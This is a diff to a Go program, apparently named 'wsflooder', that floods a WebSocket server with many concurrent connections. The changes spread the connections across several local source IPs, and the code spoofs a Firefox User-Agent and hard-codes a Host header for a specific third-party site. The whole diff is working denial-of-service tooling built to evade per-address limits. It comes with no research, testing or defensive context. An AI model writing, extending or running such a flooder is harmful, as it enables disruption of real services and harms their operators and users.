@@ -1,4 +1,4 @@
-package wsflooder
+package main
 
 import (
 	"log"
@@ -29,7 +29,7 @@ func main() {
 	}
 	itr := make(chan os.Signal)
 	signal.Notify( itr, os.Interrupt )
-	wg := &sync.WaitGroup{}
+	w := &sync.WaitGroup{}
 	max_cpu := runtime.NumCPU()
 	runtime.GOMAXPROCS(max_cpu)
 
@@ -45,16 +45,56 @@ func main() {
 		} else { l.Printf( "Error setting rlimit! (%s)", e ); return }
 	} else { l.Printf( "Error in getting rlimit! (%s)", e ); return }
 
+//	i, e := net.InterfaceByName("eno1"); if e != nil { l.Printf( "EE! Error in getting interfaces! (%s)", e ) }
+//	a, e := i.Addrs(); if e != nil {
+//		l.Printf( "EE! Error in getting IP addresses (%s)", e )
+//	} else { l.Print(a)	}
+//
+//	an, _, e := net.ParseCIDR( a[1].String() )
+//	ad, e := net.ResolveTCPAddr( "tcp4", an.String() + ":0" )
+//
+//	nd := &net.Dialer{ LocalAddr: ad }
+//	wd := &websocket.Dialer{
+//		NetDial: func( n, a string ) ( net.Conn, error ) {
+//			if cn, e := nd.Dial("tcp", a); e == nil {
+//				return cn, nil
+//			} else { return nil, e }
+//		},
+//	}
+
+	var ips []net.Addr
+	if i, e := net.InterfaceByName("eno1"); e == nil {
+		if ips, e = i.Addrs(); e == nil {
+			if len( ips ) >= max_cpu+2 {
+				l.Print( "I will use this addresses: ", ips[2:10] )
+			} else { l.Print("I wil use systems ONE IP") }
+		} else {
+			l.Printf( "I can't get addresses from interface! (%s)", e )
+			return
+		}
+	} else {
+		l.Printf( "I can't get interface by name! (%s)", e )
+		return
+	}
+
+	//	Worker spawning
 	for i:=0; i<max_cpu; i++ {
 		go func( i int ) {
-			for k:=uint16(0); k<128; k++ {
-				go worker( c, u, i, k, wg )
-				time.Sleep(time.Millisecond*100)
+			var a *net.TCPAddr
+			if ip, _, e := net.ParseCIDR( ips[2+i].String() ); e == nil {
+				if a, e = net.ResolveTCPAddr( "tcp4", ip.String() + ":0" ); e != nil {
+					l.Printf( "Promblem with resolving TCPAddr for goroutine. Using system IP (%s)", e )
+				}
+			} else { l.Printf( "Problem with parsing CIDR! (%s)", e ) }
+
+			for k:=uint16(0); k<1; k++ {
+				go worker( c, u, i, k, w, a )
+				time.Sleep( time.Millisecond * 300 )
 			}
 		}(i)
 	}
 
-//	go worker( c, u, 0, 0, wg )
+	//go worker( c, u, 0, 0, w )
 
 	for {
 		select {
@@ -62,7 +102,7 @@ func main() {
 			l.Print("Received INTERRUPT from kernel!!!")
 			close(c)
 			l.Print("DROP signals have been sended to workers!")
-			wg.Wait()
+			w.Wait()
 			return
 		}
 	}
@@ -70,7 +110,7 @@ func main() {
 }
 
 
-func worker(c chan bool, u *url.URL, nc int, nt uint16, w *sync.WaitGroup ) {
+func worker(c chan bool, u *url.URL, nc int, nt uint16, w *sync.WaitGroup, a *net.TCPAddr ) {
 	defer w.Done()
 	w.Add(1)
 	l := log.New(os.Stdout, fmt.Sprintf( "[Worker #%d-%d] ", nc, nt ), log.Ldate | log.Ltime | log.Lmicroseconds)
@@ -85,53 +125,43 @@ func worker(c chan bool, u *url.URL, nc int, nt uint16, w *sync.WaitGroup ) {
 				return
 			}
 		default:
-			l.Print("INF: Spawn connector ...")
-			if ! connector(c, u, l) {
-				l.Print("ERR: I have some errors in my connector.")
-				time.Sleep(time.Second * 1)
-				l.Print("INF: Try reconnect ...")
+			l.Print(" I'm spawning connector ...")
+			if ! connector(c, u, l, a) {
+				l.Printf( "I have promblems with my connector. Respawning it ..." )
+				time.Sleep(time.Second * 5)
 			} else {
-				l.Print("INF: Recieved STOP signal!")
-				w.Done()
+				l.Print("I recieve DROP signal!")
 				return
 			}
 		}
 	}
 }
 
-func connector(ch chan bool, u *url.URL, l *log.Logger) ( bool ) {
+func connector(ch chan bool, u *url.URL, l *log.Logger, a *net.TCPAddr) ( bool ) {
 	h := make( http.Header )
 	h.Set("Origin", u.Host)
 	h.Set("Host", "csgf.ru:2082")
 	h.Set("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0")
 
-/// PRE RELEASE Changer SIP of ws client
-	i, e := net.InterfaceByName("eno1"); if e != nil { l.Printf( "EE! Error in getting interfaces! (%s)", e ) }
-	a, e := i.Addrs(); if e != nil {
-		l.Printf( "EE! Error in getting IP addresses (%s)", e )
-	} else { l.Print(a)	}
-	l.Print( a[0] ) // debug log : IP
-
-	an, _, e := net.ParseCIDR( a[1].String() )
-	l.Print("AN ", an ,e )
-	ad, e := net.ResolveTCPAddr( "tcp4", an.String() + ":0" )
-	l.Print("AD", ad, e)
-
-	nd := &net.Dialer{ LocalAddr: ad }
-	wd := &websocket.Dialer{
-		NetDial: func( n, a string ) ( net.Conn, error ) {
-			if cn, e := nd.Dial("tcp", a); e == nil {
-				return cn, nil
-			} else { return nil, e }
-		},
+	var wd *websocket.Dialer
+	if a == nil {
+		wd = &websocket.Dialer {
+			Proxy: http.ProxyFromEnvironment,
+		}
+	} else {
+		nd := &net.Dialer { LocalAddr: a }
+		wd = &websocket.Dialer {
+			NetDial: func( n, a string ) ( net.Conn, error ) {
+				if cn, e := nd.Dial("tcp", a); e == nil {
+					return cn, nil
+				} else { return nil, e }
+			},
+		}
 	}
-	l.Print(wd)
-///	PRE RELEASE
 
 	l.Printf("Connector initialized! Connecting to %s ...", u.Host)
 
-	c, _, e := websocket.DefaultDialer.Dial(u.String(), h)
-	//_, _, _ = wd.Dial(u.String(), h)
+	c, _, e := wd.Dial(u.String(), h)
 	if e == nil {
 		l.Print("Connection established successfully!")
 	} else { l.Printf("Connection failed! (%s)", e); return false }
@@ -163,16 +193,16 @@ func connector(ch chan bool, u *url.URL, l *log.Logger) ( bool ) {
 					defer c.Close()
 					l.Print("Message has zero length");
 					return false
-				} else { } //c.WriteMessage( websocket.TextMessage, m ); }
+				} else {} //c.WriteMessage( websocket.TextMessage, m ); }
 
-				switch( m[0] ) {
-				case '3':
-					l.Print("Received PONG from server")
-				case '4':
-					l.Printf( "Meassage from server: %s", m )
-				default:
-					l.Printf( "Undefined message from server! (%s)", m )
-				}
+//				switch( m[0] ) {
+//				case '3':
+//					l.Print("Received PONG from server")
+//				case '4':
+//					l.Printf( "Meassage from server: %s", m )
+//				default:
+//					l.Printf( "Undefined message from server! (%s)", m )
+//				}
 			} else {
 				defer c.Close()
 				l.Printf( "Something wrong in reader! (%s)", e )
